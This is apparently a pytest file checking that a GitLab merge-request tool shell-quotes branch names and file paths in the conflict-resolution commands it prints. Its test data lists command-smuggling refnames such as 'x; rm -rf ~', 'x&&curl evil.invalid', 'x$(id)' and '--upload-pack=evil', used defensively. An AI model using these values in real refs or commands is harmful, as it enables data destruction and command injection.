"""A branch name a stranger chose must not become shell syntax (#694, item 2).

`gl-mr:N` prints a "To resolve:" block when an MR conflicts:

    git checkout {source} && git fetch origin && git merge origin/{target}
    git add {files} && git commit && git push

`source` is the branch of whoever opened the merge request, and `files` comes
from the conflicting diff. Git refnames permit `;`, backtick, `$`, `&`, quotes,
parentheses and spaces, and none of these were quoted.

Supertool does not run this block — it prints it for a human or an agent to
paste, which makes this hardening rather than a fix for a command injection.
"Paste this" is close enough to "run this" that the printed line has to be safe
anyway, and the reader most likely to paste it without reading is the one the
op is written for.

The bar: the printed command must shell-parse back to exactly the ref that came
out of the API, for every character a refname permits — and the ordinary case
must still print bare, because a command block that is hard to read is one that
gets skimmed instead of checked.
"""
from __future__ import annotations

import importlib.util
import shlex
from pathlib import Path
from typing import Any

import pytest

_ROOT = Path(__file__).parent.parent


def _load(rel: str, name: str) -> Any:
    spec = importlib.util.spec_from_file_location(name, _ROOT / rel)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


gl_mr = _load("presets/gitlab/mr.py", "gitlab_mr_694_refs")


@pytest.mark.parametrize("ref", [
    "master",
    "feat/694-fix.thing_2",
    "release/17.9",
    "v1.2.3",
])
def test_ordinary_ref_is_printed_bare(ref: str) -> None:
    """Quoting every branch to defend against the rare one makes the block worse."""
    assert gl_mr._shell_ref(ref) == ref


@pytest.mark.parametrize("ref", [
    "x; rm -rf ~",
    "x`id`",
    "x$(id)",
    "x&&curl evil.invalid",
    "x&y",
    "x y",
    "x'y",
    'x"y',
    "x|y",
    "x\nrm -rf ~",
    "x>out",
    "x(y)",
    "--upload-pack=evil",
    "$IFS",
])
def test_hostile_ref_survives_as_exactly_one_shell_word(ref: str) -> None:
    quoted = gl_mr._shell_ref(ref)
    assert shlex.split(f"git checkout {quoted}") == ["git", "checkout", ref]


def test_hostile_ref_under_origin_prefix_stays_one_word() -> None:
    """`origin/{target}` is the other interpolation in the same line."""
    quoted = gl_mr._shell_ref("x; rm -rf ~")
    assert shlex.split(f"git merge origin/{quoted}") == ["git", "merge", "origin/x; rm -rf ~"]


def test_option_shaped_ref_is_quoted_and_flagged_rather_than_silently_passed() -> None:
    """`-B` is inside `[A-Za-z0-9._/-]` and is still a flag, not a ref.

    Quoting cannot fix this — `git checkout '-B'` still reads a flag — so the
    test asserts what is actually delivered: it looks wrong in the block, and
    the warning above the block names it. Git itself refuses to create such a
    refname, so one arriving from the API is worth stopping over.
    """
    assert gl_mr._shell_ref("-B") == "'-B'"
    assert gl_mr._ref_warning(["-B"]) is not None


def test_conflicting_path_with_a_space_is_quoted() -> None:
    """The file list is interpolated into `git add` and comes from the diff."""
    assert shlex.split(f"git add {gl_mr._shell_ref('a file.txt')}") == ["git", "add", "a file.txt"]


def test_warning_names_the_odd_refs_only_when_there_are_some() -> None:
    """Quoting makes it safe to run; the note makes it obvious there was a reason."""
    assert gl_mr._ref_warning(["ok/branch", "other-branch"]) is None
    warning = gl_mr._ref_warning(["ok/branch", "x; rm -rf ~"])
    assert warning is not None
    assert "quoted" in warning


def test_warning_counts_every_odd_ref() -> None:
    warning = gl_mr._ref_warning(["x;y", "a b", "fine"])
    assert warning is not None
    assert "2" in warning
